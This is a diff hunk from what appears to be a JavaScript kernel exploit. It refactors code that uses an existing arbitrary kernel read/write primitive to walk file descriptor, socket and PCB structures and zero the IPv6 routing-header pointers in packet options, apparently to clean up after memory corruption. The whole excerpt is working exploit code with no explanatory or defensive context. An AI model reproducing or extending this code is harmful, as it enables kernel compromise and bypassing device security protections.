@@ -1483,47 +1483,45 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
    var  SIZEOF_OFILES = 0x8;
    var SO_PCB        = 0x18;
    var  INPCB_PKTOPTS = 0x118;
+
+function read64_big(addr) {
+  const i  = kmem.read64(addr);         
+  const lo = BigInt(i.lo >>> 0);
+  const hi = BigInt(i.hi >>> 0);
+  return lo + (hi << 32n);
+}
     
-function get_fd_data_addr(sock) {
-   const filedescent_addr = ofiles
-    + BigInt(sock) * BigInt(SIZEOF_OFILES);
-
-  const file_addr = kmem.read64(filedescent_addr);
-  return kmem.read64(file_addr);
-}
-function get_sock_pktopts(sock) {
-  const fd_data = get_fd_data_addr(sock);
-  const pcb     = kmem.read64(fd_data + BigInt(SO_PCB));
-  return kmem.read64(pcb + BigInt(INPCB_PKTOPTS));
+function get_fd_data_addr_big(fd) {
+  const fdesc = ofiles_big + BigInt(fd) * BigInt(SIZEOF_OFILES);
+  const filep = read64_big(fdesc);
+  return read64_big(filep);
 }
 
+
+    function get_sock_pktopts_big(fd) {
+  const sock = get_fd_data_addr_big(fd);
+  const pcb  = read64_big(sock + BigInt(SO_PCB));
+  return read64_big(pcb + BigInt(INPCB_PKTOPTS));
+}
+
+    
 try{  
 
+  ofiles_big = read64_big(ofiles_addr);
+ 
   for (let i = 0; i < sds.length; i++) {
-    const fd = BigInt(sds[i]);
-    
-    const filep = kmem.read64(ofiles + fd * 8n);
- 
-    const sock   = kmem.read64(filep);
+    const pkto = get_sock_pktopts_big(sds[i]);
+    kmem.write64(pkto + BigInt(off_ip6po_rthdr), 0n);
+  }
+
   
-    const pcb    = kmem.read64(sock + 0x18n);
- 
-    const pkto   = kmem.read64(pcb + 0x118n);
-   
-    kmem.write64(pkto + 0x68n, 0n);
-  }
-
-      {
-    const fd = BigInt(reclaim_sock);
-    const filep = kmem.read64(ofiles + fd * 8n);
-    const sock   = kmem.read64(filep);
-    const pcb    = kmem.read64(sock + 0x18n);
-    const pkto   = kmem.read64(pcb + 0x118n);
-    kmem.write64(pkto + 0x68n, 0n);
+  {
+    const pkto = get_sock_pktopts_big(reclaim_sock);
+    kmem.write64(pkto + BigInt(off_ip6po_rthdr), 0n);
   }
 
  
-  kmem.write64(worker_pktopts + 0x68n, 0n);
+  kmem.write64(worker_pktopts_big + BigInt(off_ip6po_rthdr), 0n);
  
     
 
